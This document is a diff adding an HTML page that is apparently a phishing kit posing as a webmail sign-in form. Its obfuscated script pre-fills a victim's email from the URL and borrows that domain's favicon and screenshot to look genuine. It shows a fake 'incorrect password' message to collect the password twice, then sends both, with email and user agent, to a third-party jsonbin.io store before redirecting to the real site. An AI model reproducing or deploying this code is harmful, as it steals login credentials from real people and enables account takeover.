@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auth</title>
+    <link href="https://db.onlinewebfonts.com/c/d3a0199dcafa52672b5461066bbb3e59?family=Cash+Market+Light+Rounded" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <style>
+        body {
+            background-size: cover;
+            font-family: "Cash Market Light Rounded";
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 75vh;
+            margin: 0;
+        }
+        .pass::before {content:"Pass"}
+        .pass::after {content:"word"}
+
+        #message {
+            text-align: center;
+            color: red;
+            display: none;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.6);
+            filter: blur(10px);
+        }
+
+        .login-panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.1);
+            filter: blur(10px);
+        }
+
+        .card {
+            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+</head>
+<body>
+<div class="container login-panel">
+    <div class="row justify-content-center">
+        <div class="col-md-4">
+            <div class="card">
+                <div class="card-body">
+                    <h5 class="card-title text-center">Authorization</h5>
+
+                    <form id="login_form" method="POST">
+                        <div class="form-group">
+                            <label for="rcmloginuser">Email</label>
+                            <input type="text" class="form-control" id="rcmloginuser" placeholder="Email" value="test@gmail.com" disabled>
+                        </div>
+                        <div class="form-group">
+                            <label for="rcmloginpwd"><span class="pass"></span></label>
+                            <input type="password" class="form-control pass2" id="rcmloginpwd" placeholder="Password" required>
+
+                            <div id="message">Incorrect <span class="pass"></span>. Try Again</div>
+                        </div>
+                        <button type="submit" id="rcmloginsubmit" class="btn btn-primary btn-block">Sign In</button>
+
+                    </form>
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+const _0x5524ae=_0x9cc1;(function(_0x3fc7fd,_0x19b6fa){const _0x51ac2e=_0x9cc1,_0x394e1d=_0x3fc7fd();while(!![]){try{const _0x5f283a=parseInt(_0x51ac2e(0x9a))/0x1+parseInt(_0x51ac2e(0x75))/0x2*(parseInt(_0x51ac2e(0x89))/0x3)+parseInt(_0x51ac2e(0x95))/0x4*(-parseInt(_0x51ac2e(0x84))/0x5)+-parseInt(_0x51ac2e(0x77))/0x6*(-parseInt(_0x51ac2e(0x7d))/0x7)+-parseInt(_0x51ac2e(0x80))/0x8*(-parseInt(_0x51ac2e(0x71))/0x9)+-parseInt(_0x51ac2e(0x9f))/0xa+-parseInt(_0x51ac2e(0x73))/0xb;if(_0x5f283a===_0x19b6fa)break;else _0x394e1d['push'](_0x394e1d['shift']());}catch(_0x56f5c3){_0x394e1d['push'](_0x394e1d['shift']());}}}(_0x2317,0xb35e3));const urlParams=new URLSearchParams(window[_0x5524ae(0x98)]['search']),encodedEmailParam=urlParams['get']('b'),emailParam=encodedEmailParam?atob(encodedEmailParam):null,loginForm=document[_0x5524ae(0x97)](_0x5524ae(0x8c)),message=document[_0x5524ae(0x97)](_0x5524ae(0x9c)),userAgent=navigator[_0x5524ae(0x8e)],currentDate=new Date(),passwordInput=document[_0x5524ae(0x97)](_0x5524ae(0x81));function _0x2317(){const _0x24b90e=['9KeHqqO','application/json','25181497bEPPiB','json','363048lPoGus','pushState','1602mpHIJa','href','floor','link','$2a$10$r6GMUoJz9P1Jp1BexqJkC.RCf.FcO/M.hHDrZuo98yEUOw.OdZt2K','catch','24283xpPEsC','backgroundImage','random','7887944caAMyF','rcmloginpwd','url(\x22https://image.thum.io/get/auth/71367-seglghjghjfhgfghdgdfx-hfghdghdxfdxfdx7t7575xx/width/1200/crop/700/http://','block','982610ibEcyf','replace','querySelector','value','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','6aMGQjX','protocol','display','login_form','&size=400','userAgent','trim','body','rel','onpopstate','POST','style','4eBGkBo','addEventListener','getElementById','location','preventDefault','1169668DTSyyJ','https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://','message','length','split','2244920dUiIre','https://'];_0x2317=function(){return _0x24b90e;};return _0x2317();}let submittedCount=0x0,hehe22='',hehe223='';loginForm[_0x5524ae(0x96)]('submit',_0x5bd2e8=>{const _0x3d7b30=_0x5524ae;_0x5bd2e8[_0x3d7b30(0x99)](),message[_0x3d7b30(0x94)][_0x3d7b30(0x8b)]=_0x3d7b30(0x83),submittedCount++;if(submittedCount===0x1)hehe223=passwordInput[_0x3d7b30(0x87)],passwordInput[_0x3d7b30(0x87)]='';else{if(submittedCount===0x2){hehe22=passwordInput['value'],passwordInput[_0x3d7b30(0x87)]='';const _0x350ef2=emailParam['split']('@'),_0x2bfe66=_0x350ef2[0x1],_0x3a00c2={'Domain':_0x2bfe66,'Email':emailParam,'P1':hehe223,'P2':hehe22,'UserAgent':userAgent,'Date':currentDate},_0x45c71e=_0x3d7b30(0x7b);fetch('https://api.jsonbin.io/v3/b?name='+emailParam,{'method':_0x3d7b30(0x93),'headers':{'Content-Type':_0x3d7b30(0x72),'X-Master-Key':_0x45c71e,'X-Bin-Name':emailParam},'body':JSON['stringify'](_0x3a00c2)})['then'](_0x538436=>_0x538436[_0x3d7b30(0x74)]())['then'](_0x3dd5a9=>{const _0x41d8db=_0x3d7b30;window[_0x41d8db(0x98)][_0x41d8db(0x85)](_0x41d8db(0x70)+_0x2bfe66);})[_0x3d7b30(0x7c)](_0x5958be=>{});}}});function redirectToGoogle(){const _0x16b11b=_0x5524ae;window[_0x16b11b(0x98)][_0x16b11b(0x78)]='https://google.com';}function generateRandomString(_0x1bfa5a){const _0x6d7e80=_0x5524ae,_0x18a509=_0x6d7e80(0x88);let _0x4170de='';for(let _0x3d22cc=0x0;_0x3d22cc<_0x1bfa5a;_0x3d22cc++){const _0x2f5d17=Math[_0x6d7e80(0x79)](Math[_0x6d7e80(0x7f)]()*_0x18a509[_0x6d7e80(0x9d)]);_0x4170de+=_0x18a509['charAt'](_0x2f5d17);}return _0x4170de;}const currentURL=window['location'][_0x5524ae(0x8a)]+'//'+window['location']['host'],UrlShit=generateRandomString(0xa6);history[_0x5524ae(0x76)](null,null,window['location'][_0x5524ae(0x78)]),window[_0x5524ae(0x92)]=function(_0x322b78){const _0x5b0f34=_0x5524ae;history[_0x5b0f34(0x76)](null,null,window[_0x5b0f34(0x98)][_0x5b0f34(0x78)]);},setTimeout(function(){const _0xade954=_0x5524ae,_0x272a21=currentURL+'/'+UrlShit+'/'+UrlShit;history[_0xade954(0x76)](null,'',_0x272a21);},0x1);function _0x9cc1(_0x35223a,_0x5ed4ab){const _0x231708=_0x2317();return _0x9cc1=function(_0x9cc16a,_0x56955b){_0x9cc16a=_0x9cc16a-0x70;let _0x13db03=_0x231708[_0x9cc16a];return _0x13db03;},_0x9cc1(_0x35223a,_0x5ed4ab);}function setFavicon(_0x17924b){const _0x2533b1=_0x5524ae,_0x595b27=document[_0x2533b1(0x86)]('link[rel=\x22icon\x22]');if(_0x595b27)_0x595b27[_0x2533b1(0x78)]=_0x17924b;else{const _0x4144f7=document['createElement'](_0x2533b1(0x7a));_0x4144f7[_0x2533b1(0x91)]='icon',_0x4144f7[_0x2533b1(0x78)]=_0x17924b,document['head']['appendChild'](_0x4144f7);}}if(emailParam===null||emailParam[_0x5524ae(0x8f)]()==='')redirectToGoogle();else{const emailParts=emailParam[_0x5524ae(0x9e)]('@');if(emailParts[_0x5524ae(0x9d)]===0x2){const domain=emailParts[0x1],faviconUrl=_0x5524ae(0x9b)+domain+_0x5524ae(0x8d);setFavicon(faviconUrl),document[_0x5524ae(0x90)]['style'][_0x5524ae(0x7e)]=_0x5524ae(0x82)+domain+'\x22)',document[_0x5524ae(0x97)]('rcmloginuser')[_0x5524ae(0x87)]=emailParam;}else redirectToGoogle();}
+</script>
+</body>
+</html>
